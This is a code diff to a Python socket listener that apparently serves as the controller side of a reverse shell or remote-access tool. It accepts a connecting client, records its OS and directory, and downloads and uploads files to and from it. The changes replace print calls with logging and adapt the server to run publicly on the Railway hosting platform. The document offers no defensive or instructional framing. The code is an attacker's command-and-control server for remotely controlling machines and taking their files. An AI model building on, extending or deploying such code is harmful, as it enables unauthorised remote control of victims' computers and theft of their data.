@@ -6,6 +6,18 @@ import base64
 import platform
 import sys
 import time
+import logging
+import traceback
+
+# Setup logging for Railway
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.StreamHandler(sys.stdout)
+    ]
+)
+logger = logging.getLogger('Server')
 
 class Listener:
     def __init__(self, ip, port):
@@ -14,10 +26,10 @@ class Listener:
         self.listener.bind((ip, port))
         self.listener.listen(0)
         self.listener.settimeout(None)
-        print(f"[+] Waiting for incoming connections on {ip}:{port}")
+        logger.info(f"[+] Waiting for incoming connections on {ip}:{port}")
         self.connection = None
         self.address = None
-        self.BUFFER_SIZE = 1024 * 1024 * 4
+        self.BUFFER_SIZE = 1024 * 1024 * 4  # 4MB buffer
         self.client_os = "Unknown"
         self.client_cwd = "/"
         self.accept_connection()
@@ -27,24 +39,24 @@ class Listener:
             try:
                 if self.connection:
                     self.connection.close()
-                print(f"[+] Listening for new connection...")
+                logger.info("[+] Listening for new connection...")
                 self.connection, self.address = self.listener.accept()
                 self.connection.settimeout(3600)
-                print(f"[+] Connection from {self.address[0]}:{self.address[1]}")
+                logger.info(f"[+] Connection from {self.address[0]}:{self.address[1]}")
                 self.init_client_info()
                 break
             except socket.timeout:
-                print("[!] Accept timed out, retrying...")
+                logger.warning("[!] Accept timed out, retrying...")
                 continue
             except Exception as e:
-                print(f"[!] Error accepting connection: {str(e)}")
+                logger.error(f"[!] Error accepting connection: {str(e)}")
                 time.sleep(1)
 
     def init_client_info(self):
         try:
             init_data = self.reliable_receive()
             if init_data is None:
-                print("[-] Connection closed before initial data received")
+                logger.error("[-] Connection closed before initial data received")
                 self.accept_connection()
                 return
 
@@ -56,17 +68,17 @@ class Listener:
 
             self.client_os = init_data.get("os", "Unknown")
             self.client_cwd = init_data.get("cwd", "/")
-            print(f"Client OS: {self.client_os}")
-            print(f"Initial directory: {self.client_cwd}")
+            logger.info(f"Client OS: {self.client_os}")
+            logger.info(f"Initial directory: {self.client_cwd}")
         except Exception as e:
-            print(f"[-] Initialization error: {str(e)}")
+            logger.error(f"[-] Initialization error: {str(e)}")
 
     def reliable_send(self, data):
         try:
             json_data = json.dumps(data)
             self.connection.sendall(json_data.encode('utf-8'))
         except (BrokenPipeError, ConnectionResetError) as e:
-            print(f"[!] Send error: {str(e)}")
+            logger.error(f"[!] Send error: {str(e)}")
             self.accept_connection()
             raise
 
@@ -92,11 +104,11 @@ class Listener:
             except socket.timeout:
                 continue
             except (ConnectionResetError, BrokenPipeError) as e:
-                print(f"[!] Connection error: {str(e)}")
+                logger.error(f"[!] Connection error: {str(e)}")
                 self.accept_connection()
                 return None
             except Exception as e:
-                print(f"[!] Receive error: {str(e)}")
+                logger.error(f"[!] Receive error: {str(e)}")
                 return None
 
     def download_file(self, remote_path):
@@ -132,7 +144,7 @@ class Listener:
                 return f"[+] Downloaded empty file to {save_path}"
 
             save_path = self.get_unique_path(file_name)
-            print(f"[+] Downloading {file_name} ({file_size/1024/1024:.2f} MB) to {save_path}")
+            logger.info(f"[+] Downloading {file_name} ({file_size/1024/1024:.2f} MB) to {save_path}")
 
             received = 0
             start_time = time.time()
@@ -158,10 +170,10 @@ class Listener:
                         progress = received / file_size * 100
                         mb_received = received / (1024 * 1024)
                         speed = mb_received / (current_time - start_time)
-                        print(f"\r[+] Downloaded: {progress:.1f}% ({mb_received:.2f} MB) - Speed: {speed:.2f} MB/s", end="", flush=True)
+                        logger.info(f"\r[+] Downloaded: {progress:.1f}% ({mb_received:.2f} MB) - Speed: {speed:.2f} MB/s")
                         last_print = current_time
 
-            print()
+            logger.info("")
             self.connection.settimeout(3600)
 
             if received == file_size:
@@ -192,11 +204,11 @@ class Listener:
             })
 
             if file_size == 0:
-                print("[+] Uploading empty file")
+                logger.info("[+] Uploading empty file")
                 response = self.reliable_receive()
                 return response if response else "[-] No upload confirmation received"
 
-            print(f"[+] Uploading {file_name} ({file_size/1024/1024:.2f} MB)...")
+            logger.info(f"[+] Uploading {file_name} ({file_size/1024/1024:.2f} MB)...")
             sent = 0
             start_time = time.time()
             last_print = start_time
@@ -219,10 +231,10 @@ class Listener:
                         progress = sent / file_size * 100
                         mb_sent = sent / (1024 * 1024)
                         speed = mb_sent / (current_time - start_time)
-                        print(f"\r[+] Progress: {progress:.1f}% ({mb_sent:.2f} MB) - Speed: {speed:.2f} MB/s", end="", flush=True)
+                        logger.info(f"\r[+] Progress: {progress:.1f}% ({mb_sent:.2f} MB) - Speed: {speed:.2f} MB/s")
                         last_print = current_time
 
-            print()
+            logger.info("")
 
             response = self.reliable_receive()
             total_time = time.time() - start_time
@@ -342,9 +354,11 @@ class Listener:
 if __name__ == '__main__':
     # Bind ke semua interface
     HOST_IP = "0.0.0.0"
-    # Gunakan PORT dari environment variable Railway, default 5555
+    
+    # Gunakan PORT dari environment variable Railway
     HOST_PORT = int(os.getenv('PORT', '5555'))
     
-    print(f"[*] Starting listener on {HOST_IP}:{HOST_PORT}")
+    # Untuk Railway, kita perlu menjalankan server secara langsung
+    logger.info(f"[*] Starting listener on {HOST_IP}:{HOST_PORT}")
     listener = Listener(HOST_IP, HOST_PORT)
     listener.run()
